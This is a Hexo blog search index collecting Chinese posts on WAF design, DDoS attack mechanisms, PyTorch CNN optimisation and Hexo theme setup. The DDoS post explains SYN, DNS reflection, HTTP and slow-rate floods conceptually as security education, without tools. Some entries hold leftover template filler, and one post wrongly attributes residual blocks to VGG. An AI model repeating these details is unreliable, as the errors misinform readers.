<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[腾讯AI-WAF建设以及维护经验]]></title>
    <url>%2F2020%2F07%2F02%2F%E8%85%BE%E8%AE%AFAI-WAF%E5%BB%BA%E8%AE%BE%E4%BB%A5%E5%8F%8A%E7%BB%B4%E6%8A%A4%E7%BB%8F%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[概述：本文来自于腾讯安全应急响应中心发布的两篇博客，主要对其中比较有启发性的一些问题做总结。 &emsp;&emsp;在本篇文章中提出了一种使用使用语义、策略、AI三种方式进行协作的AI WAF建设方式，其主要针对于XSS、SQL等具有明显的语义结构的攻击形式。 整体结构 1.流量压缩&emsp;&emsp;这里是大多数实际应用的WAF产品所必需的第一步，因为在真实的互联网环境中，正常流量与攻击流量的比例大约在10000：1，因此一般WAF产品都使用一定的策略大大减少需要使用WAF进行判断的流量，增加整个系统的处理效率。在腾讯的门神WAF中提到所使用的方法为：过滤公司出口IP、敏感攻击特征关键字进行字符串匹配（注意这里是敏感关键字匹配，不是正则，敏感关键字匹配的效率比正则表达式要高） 2.请求预处理&emsp;&emsp;请求预处理阶段是无论传统WAF还是AI WAF系统中都需要进行的检测准备，主要包括解析处理和解码处理两部分。 解析处理：对http请求按协议规范解析提取出各个字段字段的Key-Value，包括json的一些特殊处理等。 解码处理：解码处理主要是为了避免payload通过各种编码绕过检测,针对URL编码、URL多重编码、base64编码、unicode编码、html实体编码，通过解码阶段处理最终还原出原始payload，再输出给后面模块处理。 解码通常使用循环解码来保证编码已经被完全解析。 参考文档 12345graph LRA(sql注入) --&gt; B(普通注入)A --&gt; C(圆角长方形)C--&gt;D(布尔型盲注)C--&gt;E(延时盲注) 2.数学公式参考文档 &emsp;&emsp;单行数学公式: \Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\&emsp;&emsp;行内数学公式$\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\ $ 标题二1.表格 [ ] 计划任务 [x] 完成任务 2. 列表 项目 Value 电脑 $1600 手机 $12 导管 $1 Column 1 Column 2 centered 文本居中 right-aligned 文本居左 3.note标记 Default primary success info warning danger 参考文献 WAF建设运营及AI应用实践 门神WAF众测总结]]></content>
  </entry>
  <entry>
    <title><![CDATA[目标检测——FasterRCNN]]></title>
    <url>%2F2020%2F05%2F03%2F%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94FasterRCNN%2F</url>
    <content type="text"><![CDATA[概述：首页描述 标题一1.Mermaid流程图参考文档 12345graph LRA(sql注入) --&gt; B(普通注入)A --&gt; C(圆角长方形)C--&gt;D(布尔型盲注)C--&gt;E(延时盲注) 2.数学公式参考文档 &emsp;&emsp;单行数学公式: \Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\&emsp;&emsp;行内数学公式$\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\ $ 标题二1.表格 [ ] 计划任务 [x] 完成任务 2. 列表 项目 Value 电脑 $1600 手机 $12 导管 $1 Column 1 Column 2 centered 文本居中 right-aligned 文本居左 3.note标记 Default primary success info warning danger 参考文献 xxx xxx]]></content>
  </entry>
  <entry>
    <title><![CDATA[安全——ddos]]></title>
    <url>%2F2020%2F04%2F24%2F%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94ddos%2F</url>
    <content type="text"><![CDATA[概述：Ddos攻击是目前在互联网中非常常见而且难以解决的网络攻击之一，其主要方式就是使用控制的僵尸网络来消耗服务器的资源，使服务器不再能够为正常用户提供服务。大部分的Ddos攻击都会利用服务器的各种漏洞以及基础设施漏洞的对僵尸网络的流量进行放大，从而做到以小搏大的效果，提升攻击的效率。本文对SYN Flood、DNS Query Flood、HTTP Flood等常见的Ddos攻击原理做详解，以及作者的一些理解。 1.SYN Flood&emsp;&emsp;SYN Flood是互联网上最经典的DDoS攻击方式之一，最早出现于1999年左右，雅虎是当时最著名的受害者。SYN Flood攻击利用了TCP三次握手的缺陷，能够以较小代价使目标服务器无法响应，且难以追查。 标准的TCP三次握手过程如下： &emsp;&emsp;客户端发送一个包含SYN标志的TCP报文，SYN即同步(Synchronize)，同步报文会指明客户端使用的端口以及TCP连接的初始序号; &emsp;&emsp;服务器在收到客户端的SYN报文后，将返回一个SYN+ACK(即确认Acknowledgement)的报文，表示客户端的请求被接受，同时TCP初始序号自动加1; &emsp;&emsp;客户端也返回一个确认报文ACK给服务器端，同样TCP序列号被加1。 &emsp;&emsp;经过这三步，TCP连接就建立完成。TCP协议为了实现可靠传输，在三次握手的过程中设置了一些异常处理机制。第三步中如果服务器没有收到客户端的最终ACK确认报文，会一直处于SYN_RECV状态，将客户端IP加入等待列表，并重发第二步的SYN+ACK报文。重发一般进行3-5次，大约间隔30秒左右轮询一次等待列表重试所有客户端。另一方面，服务器在自己发出了SYN+ACK报文后，会预分配资源为即将建立的TCP连接储存信息做准备，这个资源在等待重试期间一直保留。更为重要的是，服务器资源有限，可以维护的SYN_RECV状态超过极限后就不再接受新的SYN报文，也就是拒绝新的TCP连接建立。 &emsp;&emsp;SYN Flood正是利用了上文中TCP协议的设定，达到攻击的目的。攻击者伪装大量的IP地址给服务器发送SYN报文，由于伪造的IP地址几乎不可能存在，也就几乎没有设备会给服务器返回任何应答了。因此，服务器将会维持一个庞大的等待列表，不停地重试发送SYN+ACK报文，同时占用着大量的资源无法释放。更为关键的是，被攻击服务器的SYN_RECV队列被恶意的数据包占满，不再接受新的SYN请求，合法用户无法完成三次握手建立起TCP连接。也就是说，这个服务器被SYN Flood拒绝服务了。 2.DNS Query Flood&emsp;&emsp;作为互联网最基础、最核心的服务，DNS自然也是DDoS攻击的重要目标之一。打垮DNS服务能够间接打垮一家公司的全部业务，或者打垮一个地区的网络服务。前些时候风头正盛的黑客组织anonymous也曾经宣布要攻击全球互联网的13台根DNS服务器，不过最终没有得手。 DNS Query Flood的攻击目标为DNS基础设施 &emsp;&emsp;UDP攻击是最容易发起海量流量的攻击手段，而且源IP随机伪造难以追查。但过滤比较容易，因为大多数IP并不提供UDP服务，直接丢弃UDP流量即可。所以现在纯粹的UDP流量攻击比较少见了，取而代之的是UDP协议承载的DNS Query Flood攻击。简单地说，越上层协议上发动的DDoS攻击越难以防御，因为协议越上层，与业务关联越大，防御系统面临的情况越复杂。 DNS Query Flood就是攻击者操纵大量傀儡机器，对目标发起海量的域名查询请求。为了防止基于ACL的过滤，必须提高数据包的随机性。常用的做法是UDP层随机伪造源IP地址、随机伪造源端口等参数。在DNS协议层，随机伪造查询ID以及待解析域名。随机伪造待解析域名除了防止过滤外，还可以降低命中DNS缓存的可能性，尽可能多地消耗DNS服务器的CPU资源。 3.DNS 反射攻击&emsp;&emsp;使用DNS反射攻击，攻击者会构造一份请求，将该请求的发件方填写成为自己想要攻击的目标，然后将该请求发送给DNS解析服务器，DNS解析服务器受到该请求后会给出相当详尽的响应信息，并通过庞大的数据包，将其发送给攻击者想要攻击的地址，从达到攻击者使用较小的带宽来消耗目标服务器较大的带宽。 发送的 DNS 查询请求数据包大小一般为 60 字节左右，而查询返回结果的数据包大小通常为 3000 字节以上，因此，使用该方式进行放大攻击能够达到 50 倍以上的放大效果。 正常DNS查询：&emsp;&emsp;源IP地址 —–DNS查询—-&gt; DNS服务器 —–DNS回复包—-&gt; 源IP地址 DNS反射攻击：&emsp;&emsp;伪造IP地址 —–DNS查询—-&gt; DNS服务器 —–DNS回复包—-&gt; 伪造的IP地址（攻击目标） 防御方法： &emsp;&emsp;1.如果内部有DNS服务器，将DNS服务器设置为只对内部DNS解析请求相应。 &emsp;&emsp;2.限制DNS响应包大小，超过限制大小的数据包直接丢弃。 4.HTTP Flood（CC攻击）&emsp;&emsp;攻击者通过代理或僵尸主机向目标服务器发起大量的HTTP报文，请求涉及数据库操作的URI（Universal Resource Identifier）或其它消耗系统资源的URI，造成服务器资源耗尽，无法响应正常请求。例如门户网站经常受到的HTTP Flood攻击，攻击的最大特征就是选择消耗服务器CPU或内存资源的URI，如具有数据库操作的URI。 CC攻击的特性： 1.攻击对象：一般Ddos都是针对IP进行的拒绝服务，而CC攻击是针对页面进行的拒绝服务。 2.攻击发起者：CC攻击绝大多数都需要使用僵尸网络进行攻击，使用IP也都是真实的肉鸡IP地址。 2.请求有效性：CC攻击的请求都是正常的请求，IP地址也都是正常的IP。 3.受到攻击后的表现:服务器可以正常ping通，但是网页无法访问。 5. 慢速攻击&emsp;&emsp;慢速攻击是CC攻击的一种变体，和CC攻击一样，只要Web服务器开放了Web服务，那么它就可以是一个靶子，HTTP协议在接收到request之前是不对请求内容作校验的，所以即使你的Web应用没有可用的form表单，这个攻击一样有效。 基本原理： &emsp;&emsp;对任何一个开放了HTTP访问的服务器HTTP服务器，先建立了一个连接，指定一个比较大的content-length，然后以非常低的速度发包，比如1-10s发一个字节，然后维持住这个连接不断开。如果客户端持续建立这样的连接，那么服务器上可用的连接将一点一点被占满，从而导致拒绝服务。 &emsp;&emsp;在客户端以单线程方式建立较大数量的无用连接，并保持持续发包的代价非常的低廉。实际试验中一台普通PC可以建立的连接在3000个以上。这对一台普通的Web server，将是致命的打击。更不用说结合肉鸡群做分布式DoS了。鉴于此攻击简单的利用程度、拒绝服务的后果、带有逃逸特性的攻击方式，这类攻击一炮而红，成为众多攻击者的研究和利用对象。 细分实例： &emsp;&emsp;慢速攻击发展到今天，其种类可以分为下面几个种类： 1.low headers &emsp;&emsp;Web应用在处理HTTP请求之前都要先接收完所有的HTTP头部，因为HTTP头部中包含了一些Web应用可能用到的重要的信息。攻击者利用这点，发起一个HTTP请求，一直不停的发送HTTP头部，消耗服务器的连接和内存资源。抓包数据可见，攻击客户端与服务器建立TCP连接后，每30秒才向服务器发送一个HTTP头部，而Web服务器再没接收到2个连续的\r\n时，会认为客户端没有发送完头部，而持续的等等客户端发送数据。 2.Slow body&emsp;&emsp;攻击者发送一个HTTP POST请求，该请求的Content-Length头部值很大，使得Web服务器或代理认为客户端要发送很大的数据。服务器会保持连接准备接收数据，但攻击客户端每次只发送很少量的数据，使该连接一直保持存活，消耗服务器的连接和内存资源。抓包数据可见，攻击客户端与服务器建立TCP连接后，发送了完整的HTTP头部，POST方法带有较大的Content-Length，然后每10s发送一次随机的参数。服务器因为没有接收到相应Content-Length的body，而持续的等待客户端发送数据。 3.Slow read&emsp;&emsp;客户端与服务器建立连接并发送了一个HTTP请求，客户端发送完整的请求给服务器端，然后一直保持这个连接，以很低的速度读取Response，比如很长一段时间客户端不读取任何数据，通过发送Zero Window到服务器，让服务器误以为客户端很忙，直到连接快超时前才读取一个字节，以消耗服务器的连接和内存资源。抓包数据可见，客户端把数据发给服务器后，服务器发送响应时，收到了客户端的ZeroWindow提示（表示自己没有缓冲区用于接收数据），服务器不得不持续的向客户端发出ZeroWindowProbe包，询问客户端是否可以接收数据。 参考文献 https://www.jianshu.com/p/dff5a0d537d8 https://www.cnblogs.com/bonelee/p/9204826.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[卷积神经网络——常见优化技巧]]></title>
    <url>%2F2020%2F03%2F29%2F%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%A7%81%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文为卷积神经网络的进阶版使用使用技巧，包括1*1、全局平均池化等操作进行各种模型优化，并采用对比实验的方式来对效果进行直观展示。 1*1卷积的使用&emsp;&emsp;在使用卷积神经网络进行大量卷积运算时，最常用的优化方法就是采用1*1的卷积核降低kernel，然后再使用卷积较大的卷积核进行卷积。该方法来自于Google提出的Inception模型，在该模型的模型优化中，作者针对采用多个并行的卷积核所产生的参数过多的问题，提出在深层卷积之前先采用1*1的卷积进行降channel，然后再使用想要的卷积核进行卷积，在达到相同效果的前提下显著降低网络参数数量。 原理&emsp;&emsp;对于输入数据维度为（$B_i，C_i，W_i，H_i$）的卷积神经网络使用为（$C_f,W_f,H_f$）的卷积核进行特征提取，卷积层网络参数的计算公式: Parameters = C_i*C_f*W_f*W_h+C_f&emsp;&emsp;以输入数据维度(128,24,50,50)、使用卷积层为（48,3,3）为例，直接使用卷积层参数个数为： Parameters1 = 24*3*3*48+48 = 10416&emsp;&emsp;而如果在使用该卷积核之前先使用一个(12,1,1)的卷积核进行降channel到12，那么该部分的参数个数为： Parameters2 = 24*1*1*12 +12*3*3*48+48 = 5520​ 参数数量下降了近一倍。 对比实验&emsp;&emsp;本文的对比实验采用以前自己写的一个模型进行实验，进行实验，原始模型结构如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071class Char_CNN(nn.Module): def __init__(self,num_embeddings,embedding_dim,channel=1,feature_size=300): """ Parameters: ------------- channel: 深度、通道数 feature_size: 特征向量大小 """ super(Char_CNN,self).__init__() self.embedding = nn.Embedding(num_embeddings,embedding_dim) self.feature_size = feature_size self.cnn1 = nn.Sequential( nn.Conv1d(channel,24,(3,embedding_dim),padding=1), nn.BatchNorm2d(24), nn.ReLU(inplace=True), nn.MaxPool2d(2) ) self.cnn2 = nn.Sequential( nn.Conv1d(24,48,3,padding=1,), nn.BatchNorm1d(48), nn.ReLU(inplace=True), nn.MaxPool1d(2) ) self.linear1 = nn.Sequential( nn.Linear(feature_size//4*48*2,128), nn.Dropout(0.3), nn.BatchNorm1d(128), nn.ReLU(inplace=True) ) self.linear2 = nn.Sequential( nn.Linear(128,2), nn.Dropout(0.3), nn.BatchNorm1d(2), nn.Softmax() ) def forward(self,x): """ x: (batch_size,feature_size),默认为channel为1 (batch_size,channel,feature_size) ,channel要与初始化时一致 """ # 二维向量要加入深度1再进行CNN if x.dim()==2: x = torch.unsqueeze(x,1) sample_nums = x.shape[0] x = self.embedding(x) cnn1_output = self.cnn1(x) cnn1_output = torch.squeeze(cnn1_output) cnn2_output = self.cnn2(cnn1_output) cnn1_output = cnn1_output.view(sample_nums,-1) cnn2_output = cnn2_output.view(sample_nums,-1) cnn_output = torch.cat([cnn1_output,cnn2_output],dim=1) x = cnn_output.view(sample_nums,-1) x = self.linear1(x) x = self.linear2(x) return x &emsp;&emsp;网络各层参数情况为： &emsp;&emsp;使用1*1卷积核对上述网络中的卷积部分进行优化，在第二个卷积核前面增加一个(12,1)的卷积核进行降维（下图中略去BN、ReLu、等层，详细结构可以看下面的代码） 123456graph TB Embedding--&gt; Conv1d(Conv 24,3*3) --&gt; Conv2d(Conv 48,3*3) --&gt;Linear1(Linear)--&gt;Linear2(Linear) Conv1d(Conv 24,3*3)--&gt;Linear1(Linear) Embedding2(Embedding)--&gt; C1(Conv 24,3*3) --&gt; C_aa(Conv 12,1*1)--&gt;C2(Conv 48,3*3) --&gt;L1(Linear)--&gt;L2(Linear) C1(Conv 24,3*3)--&gt;L1(Linear) 为什么在第一个卷积核上也应用1*1卷积核降channel技巧？ ​ 因为该卷积核原始深度已经为1，无法进行降channel 模型结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import torchimport torch.nn as nnclass Char_CNN(nn.Module): def __init__(self,num_embeddings,embedding_dim,channel=1,feature_size=300): super(Char_CNN,self).__init__() self.embedding = nn.Embedding(num_embeddings,embedding_dim) self.feature_size = feature_size self.cnn1 = nn.Sequential( nn.Conv1d(channel,24,(3,embedding_dim),padding=1), nn.BatchNorm2d(24), nn.ReLU(inplace=True), nn.MaxPool2d(2) ) self.cnn2 = nn.Sequential( nn.Conv1d(24,12,1), nn.BatchNorm1d(12), nn.ReLU(inplace=True), nn.Conv1d(12,48,3,padding=1), nn.BatchNorm1d(48), nn.ReLU(inplace=True), nn.MaxPool1d(2), ) self.linear1 = nn.Sequential( nn.Linear(feature_size//4*48*2,128), nn.Dropout(0.3), nn.BatchNorm1d(128), nn.ReLU(inplace=True) ) self.linear2 = nn.Sequential( nn.Linear(128,2), nn.Dropout(0.3), nn.BatchNorm1d(2), nn.Softmax() ) def forward(self,x): """ x: (batch_size,feature_size),默认为channel为1 (batch_size,channel,feature_size) ,channel要与初始化时一致 """ # 二维向量要加入深度1再进行CNN if x.dim()==2: x = torch.unsqueeze(x,1) sample_nums = x.shape[0] x = self.embedding(x) cnn1_output = self.cnn1(x) cnn1_output = torch.squeeze(cnn1_output) cnn2_output = self.cnn2(cnn1_output) cnn1_output = cnn1_output.view(sample_nums,-1) cnn2_output = cnn2_output.view(sample_nums,-1) cnn_output = torch.cat([cnn1_output,cnn2_output],dim=1) x = cnn_output.view(sample_nums,-1) x = self.linear1(x) x = self.linear2(x) return x &emsp;&emsp;使用torchSummary进行参数可视化： &emsp;&emsp;可以看出，优化后的形成的两个卷积总参数个数为2076，远远小于原来的3504。 使用全局平均池化层替代全连接&emsp;&emsp;在一般的卷积神经网络中，一般将卷积层作为特征提取模块进行特征提取，然后再在接上全连接网络进行特这个组合，将维度映射到目标维度。但是因为全连接神经网络具有需要固定输入长度、参数量巨大等缺点，因此出现了各种方式对全连接网络进行取代，最常用一种方式是在《Network In Network》论文中提出的使用global average pooling（简称GAP）替代全连接网络的方法。 方法 &emsp;&emsp;如果要预测K个类别，在卷积特征抽取部分的最后一层卷积层，就会生成K个特征图，然后通过全局平均池化就可以得到 K个1×1的特征图，将这些1×1的特征图输入到softmax layer之后，每一个输出结果代表着这K个类别的概率（或置信度 confidence），起到取代全连接层的效果。 优势&emsp;&emsp;使用global average pooling取代全连接网络具有如下优势： 全局平均池化层不需要参数，从而有效防止全连接网络中产生的过拟合问题。 使网络不必再固定输入数据大小. pytorch实现&emsp;&emsp;在pytorch中并没有直接的global average pooling实现，但可以通过使用adaptive_avg_pool函数实现，该函数可以指定输出的向量形式，指定各个feature map的都转化成为1维即可实现相同效果。下面以二维数据为例： 1torch.nn.functional.adaptive_avg_pool2d(a, (1,1)) 对比实验&emsp;&emsp;使用global average pooling继续对上面的Char_CNN网络进行优化，优化后的网络如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import torchimport torch.nn as nnclass Char_CNN(nn.Module): def __init__(self,num_embeddings,embedding_dim,channel=1,feature_size=300): """ Parameters: ------------- channel: 深度、通道数 feature_size: 特征向量大小 """ super(Char_CNN,self).__init__() self.embedding = nn.Embedding(num_embeddings,embedding_dim) self.feature_size = feature_size self.cnn1 = nn.Sequential( nn.Conv1d(channel,24,(3,embedding_dim),padding=1), nn.BatchNorm2d(24), nn.ReLU(inplace=True), nn.MaxPool2d(2) ) self.cnn2 = nn.Sequential( nn.Conv1d(24,12,1), nn.BatchNorm1d(12), nn.ReLU(inplace=True), nn.Conv1d(12,48,3,padding=1), nn.BatchNorm1d(48), nn.ReLU(inplace=True), nn.MaxPool1d(2), ) self.prepare_output_cnn1 = nn.Sequential( nn.Conv1d(24,2,1), nn.BatchNorm1d(2), nn.ReLU(inplace=True), ) self.prepare_output_cnn2 = nn.Sequential( nn.Conv1d(48,24,1), nn.BatchNorm1d(24), nn.ReLU(inplace=True), nn.Conv1d(24,2,1), ) self.global_avg_pool = nn.AdaptiveAvgPool1d(1) def forward(self,x): """ x: (batch_size,feature_size),默认为channel为1 (batch_size,channel,feature_size) ,channel要与初始化时一致 """ # 二维向量要加入深度1再进行CNN if x.dim()==2: x = torch.unsqueeze(x,1) sample_nums = x.shape[0] x = self.embedding(x) cnn1_output = self.cnn1(x) cnn1_output = torch.squeeze(cnn1_output,-1) cnn2_output = self.cnn2(cnn1_output) cnn1_pre_out = self.prepare_output_cnn1(cnn1_output) cnn2_pre_out = self.prepare_output_cnn2(cnn2_output) cnn1_pre_out = self.global_avg_pool(cnn1_pre_out) cnn2_pre_out = self.global_avg_pool(cnn2_pre_out) x = torch.squeeze(cnn1_pre_out+cnn2_pre_out,-1) x = nn.Softmax()(x) return x &emsp;&emsp;使用torchSummaryM查看模型参数可以发现，虽然增加了一部分CNN网络以适应使用GAP输出额外产生了一部分参数，但是这部分参数与直接使用全连接网络相比，完全不在一个数量级上。 残差块使用&emsp;&emsp;现如今只要用到比较深层的神经网络，那么网络中必不可少的就会使用残差结构，那么什么是残差结构呢？残差结构来源于2014年提出的VGG NET，在该网络中为了解决模型深度越来越深造成的信息衰减问题，作者使用将原始的输入与卷积进行特征提取后的向量共同进行输出使模型不出现效果的衰减的做法被称为残差结构。残差网络中最有普遍借鉴意义的结构就是残差块，因此本文中只对残差块做重点介绍。 优势&emsp;&emsp;理论上可以使模型深度达到无限深而不出出现衰减问题。 原理&emsp;&emsp;残差块可表示为： x_{l+1} = x_l+F(x_l,W_1)&emsp;&emsp;残差块分成两部分直接映射部分和残差部分。$x_l$是直接映射，反应在下图中是左边的曲线;$F(x_l,W_1)$是残差部分，一般由两个或者三个卷积操作构成，即下图右侧包含卷积的部分。 从信息论的角度讲，由于DPI（数据处理不等式）的存在，在前向传输的过程中，随着层数的加深，Feature Map包含的图像信息会逐层减少，而ResNet的直接映射的加入，保证了$l+1$层的网络一定比$l$层包含更多的图像信息。 &emsp;&emsp;残差块的基本结构如下图所示: &emsp;&emsp;其中weight表示卷积操作，addition是指单位加操作。 &emsp;&emsp;在卷积神经网络中经常会出现的问题是$x_l$和$x_{l+1}$的featuremap的维度是不同的，因此如果出现了这种情况就可以采用前面我们提到过的1*1卷积核进行降channel技巧来保持二者维度一致。 &emsp;&emsp;经过文章作者的反复试验，证明将relu函数放在残差模块可以提高精度，因此出现了残差单元的另一种实现： pytorch实现&emsp;&emsp;这里采用第三种网络结构进行完善，使用pytorch实现如下： 1234567891011121314151617181920212223242526272829class Res_block(nn.Module): def __init__(self,input_channel,output_channel): """ input_channel: 输入通道数 output_channel: 输出通道数 """ super(Res_block,self).__init__() self.input_channel = input_channel self.output_channel = output_channel self.res = nn.Sequential( nn.Conv1d(input_channel,output_channel,3,padding=1), nn.BatchNorm1d(output_channel), nn.ReLU(), nn.Conv1d(output_channel,output_channel,3,padding=1), nn.BatchNorm1d(output_channel), nn.ReLU() ) # 输入输出通道数不同时进行降维的1*1卷积 if input_channel!=output_channel: self.prepare_concat = nn.Conv1d(output_channel,input_channel,1) def forward(self,x): res = self.res(x) if self.input_channel!=self.output_channel: res = self.prepare_concat(res) x += res return x 深度可分离卷积使用&emsp;&emsp;深度可分离卷积来源于2016提出的Xception，是指将正常使用的卷积核分离成depthwise(DW)和pointwise(PW)两个部分，Depthwise Convolution负责使用负责各个通道内部的特征提取，Pointwise Convolution负责跨通道的特征提取,从而降低运算量和计算成本。 原理传统卷积 &emsp;&emsp;这里以原始输入为（3,5,5）为例，使用传统的卷积方式进行卷积，使用通道数为5的（3，3）的卷积进行卷积层进行卷积（padding保持W、H不变），经过该卷积后，输出尺寸为（4,5,5） &emsp;&emsp;最终该卷积层参数为： N_{std} = 4 × 3 × 3 × 3+4 = 112深度可分离卷积 &emsp;&emsp;将上面的卷积核转化为两部分进行： Depthwise Convolution &emsp;&emsp;Depthwise Convolution的一个卷积核负责一个通道，一个通道只被一个卷积核卷积，即使用M个(3,3)的卷积核进行一对一输入M个通道，不求和，分别生成M个结果。对于（3,5,5）的原始输入数据，DW采用通道数为3的（3,3）卷积核进行，该卷积完全是在二维平面内进行，卷积核的数量与上一层的通道数相同（通道和卷积核一一对应）。所以一个三通道的图像经过运算后生成了3个Feature map，如下图所示。 &emsp;&emsp;DW卷积核参数个数为： N_{depthwise} = 3 × 3 × 3+3 = 30 注意：这里由于是一一对应因此参数综述并不是3*3*3*3 &emsp;&emsp;Depthwise Convolution完成后的Feature map数量与输入层的通道数相同，无法扩展Feature map。而且这种运算对输入层的每个通道独立进行卷积运算，没有有效的利用不同通道在相同空间位置上的feature信息。因此需要Pointwise Convolution来将这些Feature map进行组合生成新的Feature map. Pointwise Convolution &emsp;&emsp;Pointwise Convolution的运算与常规卷积运算非常相似，它的卷积核的尺寸为 1×1×M，M为上一层的通道数。所以这里的卷积运算会将上一步的map在深度方向上进行加权组合，生成新的Feature map。有几个卷积核就有几个输出Feature map. &emsp;&emsp;PW部分的参数个数为： N_{pointwise} = 1 × 1 × 3 × 4 +4= 16 &emsp;&emsp;采用深度可分离卷积的参数总量为： N_{separable} = N_{depthwise} + N_{pointwise} = 46&emsp;&emsp;可以明显看出，深度分离卷积的参数个数远远小于传统的卷积方式。 PyTorch实现&emsp;&emsp;对于深度可分离卷积的实现关键是Deepthwise卷积的实现，而在pytorch 0.4以后的版本中在卷积层函数中加入了接口来方便这一实现。在新版本的pytorch中，加入了groups参数，该参数默认为1，意思是将输入分为一组，此时是常规卷积，当将其设为in_channels时，意思是将输入的每一个通道作为一组，然后分别对其卷积，输出通道数为k，最后再将每组的输出串联。 1class torch.nn.Conv2d(in_channels, out_channels, kernel_size, stride=1, padding=0, dilation=1, groups=1,bias=True) &emsp;&emsp;而对于Pointwise卷积的实现则是一个标准的1*1卷积网络，因此深度可分离网络的pytorch实现如下： 12345678910class Dp_Net(nn.Module): def __init__(self,input_channel,output_channel): super(Dp_Net,self).__init__() self.depthwise = nn.Conv2d(input_channel,input_channel,3,padding=1,groups=input_channel) self.pointwise = nn.Conv2d(input_channel,output_channel,1) def forward(self,x): x = self.depthwise(x) x = self.pointwise(x) return x &emsp;&emsp;使用torchSummaryM进行参数可视化： 参考文献 https://blog.csdn.net/CVSvsvsvsvs/article/details/90495254 https://zhuanlan.zhihu.com/p/42706477 https://zhuanlan.zhihu.com/p/92134485]]></content>
      <categories>
        <category>深度学习</category>
        <category>卷积神经网络</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>pytorch</tag>
        <tag>卷积神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客——优雅写作]]></title>
    <url>%2F2020%2F03%2F19%2Fhexo%E5%8D%9A%E5%AE%A2%E2%80%94%E2%80%94%E4%BC%98%E9%9B%85%E5%86%99%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近时间闲暇萌生了好好进行一些博客管理的念头，为了以后写文章更加方便美观，写了本篇博客意在将本人如何进行博客写作以及如何使博客文章内容更加美观进行记录，以供有同样需要的人进行参考。 写作技巧使用添加背景色&emsp;为段落添加背景色可以通过note标签来完成，其标准格式为: 文本内容 (支持行内标签) &emsp;&emsp;支持的class类型包括多种，包括default primary success info warning danger，也可以不指定 class。下面各种class对应的颜色效果展示： Default Default primary success info warning danger &emsp;&emsp;这里支持的背景色显示形式也支持多种风格，可以直接在主题配置文件中进行设置 themes/next/_config.yml123456note: # Note 标签样式预设 style: modern # simple | modern | flat | disabled icons: false # 是否显示图标 border_radius: 3 # 圆角半径 light_bg_offset: 0 # 默认背景减淡效果，以百分比计算 流程图&emsp;&emsp;要在站点中使用流程图，首先要在主题的_config.yml文件中进行设置 themes/next/_config.yml12345mermaid:- enable: false+ enable: true # Available themes: default | dark | forest | neutral theme: forest &emsp;&emsp;然后就可以在网站中按照mermaid语法进行流程图的构建了，下面是一个简单的流程图构建的例子，更加详细的流程图构建语法可以参见这里 12345graph LRA(sql注入) --&gt; B(普通注入)A --&gt; C(圆角长方形)C--&gt;D(布尔型盲注)C--&gt;E(延时盲注) 模板评论]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客升级]]></title>
    <url>%2F2020%2F03%2F18%2Fhexo%E5%8D%9A%E5%AE%A2%E5%8D%87%E7%BA%A7%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近将hexo博客的next主题从5.11更新到7.7.2，写下本篇博客记录下完整的更新过程，以待有需要的同学使用。 1.将当前目录下已有的next文件夹重命名为next2themes/1mv next next2 2.从github上下载最新的next主题&emsp;&emsp;在网站目录下重新clone一份新的next，将其存储为next 1git clone https://github.com/theme-next/hexo-theme-next themes/next 3.修改主题目录下的_config.xml文件&emsp;&emsp;参照next2文件夹中的_config.yml文件修改next文件夹中的_config.yml文件 themes/next/_config.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#主题选择scheme: Gemini# 菜单栏menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive# github、Email显示social: GitHub: https://github.com/xxx || github E-Mail: xxx@gmail.com || envelope# 增加评论功能gitalk: enable: true github_id: AnchoretY # GitHub repo owner repo: AnchoretY.github.io # Repository name to store issues client_id: xxx # GitHub Application Client ID client_secret: xxx # GitHub Application Client Secret admin_user: xxx # GitHub repo owner and collaborators, only these guys can initialize gitHub issues distraction_free_mode: true # Facebook-like distraction free mode language: zh-CN# 搜索功能local_search: enable: true # 右边栏引用开源协议creative_commons: license: by-nc-sa sidebar: true #边栏 post: true #文章底部 # 修改左侧目录导航toc: number: false #是否对标题自动编号 enable: true #开启目录导航 wrap: false expand_all: true #默认展开全部内容 max_depth: 4 # 导航栏最大显示的目录层级# 修改站角信息显示footer: since: 2018 # 建站时间 icon: name: heart # 图标名称 animated: true # 开启动画 color: "#ff0000" # 图标颜色 powered: enable: true # 显示由 Hexo 强力驱动 version: false # 隐藏 Hexo 版本号 theme: enable: true # 显示所用的主题名称 version: false # 隐藏主题版本号 自己打开了不蒜子统计，只需要在页面中添加 4.更该页面语言&emsp;&emsp;在新版本的next主题中将以前的zh-xxx改为了zh-CN,需要将站点目录下的_config.yml文件作相应更改。 /_config.xml diff:true12- language: zh-xxx+ language: zh-CN 5.字数与阅读时长统计&emsp;&emsp;首先安装hexo-symbols-count-time插件 1npm install hexo-symbols-count-time &emsp;&emsp;接下来在站点目录下_config.yml文件中添加： 123456symbols_count_time: symbols: true # 文章字数统计 time: true # 文章阅读时长 total_symbols: false # 站点总字数统计 total_time: false # 站点总阅读时长 exclude_codeblock: false # 排除代码字数统计 